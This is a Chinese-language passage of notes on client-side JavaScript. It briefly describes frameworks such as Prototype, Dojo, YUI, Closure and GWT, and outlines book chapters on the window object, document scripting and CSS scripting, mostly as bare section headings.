第19章会介绍jQuery，jQuery是当前最流行的框架之一。如果你决定在你的项目中使用jQuery，还应该阅读第19章的内容；理解底层API会帮助你成为更加优秀的web开发者，即使你很少直接使用它们。

除了jQuery以外，还有一些其他的javascript框架——远超过在这里列出的框架。其中有些开源框架非常有名且广泛使用：

* Prototype：Prototype类库（http://prototypejs.org）和jQuery类似，是专门针对DOM和Ajax实现的一套实用工具，此外还为语言核心扩展了很多实用工具，Scriptaculous（http://script.aculo.us）类库是基于Prototype来实现的，可以用来做动画和各种视觉特效。
* Dojo：Dojo（http://dojotoolkit.org）是一个大型的框架，它宣称自己“深不可测”。它包含一个种类繁多的UI组件集合、包管理系统、数据抽象层等。
* YUI：YUI（http://developer.yahoo.com/yui/）是Yahoo！使用的一个著名框架，是Yahoo!的工程师团队开发的，已经应用在包含Yahoo!主页在内的诸多项目中。YUI和Dojo一样庞大，是一个无所不包的类库，包括语言工具、DOM工具，UI组件等。目前已经有两个不兼容版本的YUI存在，分别为YUI2和YUI3。
* Closure：Closure类库（http://code.google.com/closure/library/）是google应用于Gmail、GoogleDocs和其他web应用的客户端类库。这个类库是打算和Closure编译器（http://code.google.com/closure/compiler）配合使用，剔除没有用的类库函数。因为没有用的代码会在部署之前被移除，Closure类库的设计者不需要保持特性集合的紧凑，所以Closure包含一个庞大的实用工具集合。
* GWT：GWT，即GoogleWebToolkit（http://code.google.com/webtoolkit/）是一个完全不同类型的客户端框架。它用JAVA定义了web应用接口，并提供编译器，将JAVA程序翻译成兼容的客户端javascript。GWT在一些Google产品中使用，但是不如它们自己的Closure类库使用得那么广泛。


window对象
----------
第13章介绍了Window对象及其在客户端javascript中所扮演的核心角色：它是客户端javascript程序的全局对象。本章介绍window对象的属性和方法，这些属性定义了许多不同的API，但是只有一部分实际上和浏览器窗口有关。Window对象是以窗口命名的。本章介绍以下方面：

* 14.1节展示如何使用setTimeout()和setInterval()来注册一个函数，并在指定的时间后调用它。
* 14.2节讲解如何使用location属性来获取当前显示文档的URL和载入新的文档。
* 14.3节介绍history属性，并展示如何在历史纪录中向前和向后移动。
* 14.4节展示如何使用navigator属性来获取浏览器厂商和版本信息，以及如何使用screen属性来查询窗口尺寸。
* 14.5节展示如何使用alert()、prompt()和confirm()方法来显示简单的文本对话框，以及如何用showModalDialog()显示HTML对话框。
* 14.6节讲解如何注册onerror处理方法，这个方法在未捕获的javascript异常发生时调用。
* 14.7节讲解HTML元素的ID和name作为window对象的属性来使用。
* 14.8节是一个很长的节，讲解如何打开和关闭浏览器窗口，以及如何编写可以在多个窗口和嵌套窗体中工作的javascript代码。

**14.1计时器**

**14.2浏览器定位和导航**
**14.3浏览历史**
**14.4浏览器和屏幕信息**
**14.5对话框**
**14.6错误处理**
**14.7作为window对象属性的文档元素**
**14.8多窗口和窗体**

脚本化文档
----------
**15.1dom概览**
**15.2选取文档元素**
**15.3文档结构和遍历**
**15.4属性**
**15.5元素的内容**
**15.6创建、插入和删除节点**
**15.7例子：生成目录表**
**15.8文档和元素的几何形状和滚动**
**15.9html表单**
**15.10其他文档特性**

脚本化css
---------
**16.1css概览**
**16.2重要的css属性**
**16.3脚本化内联样式**
**16.4查询计算出的样式**
**16.5脚本化css类**
**16.6脚本化样式表**

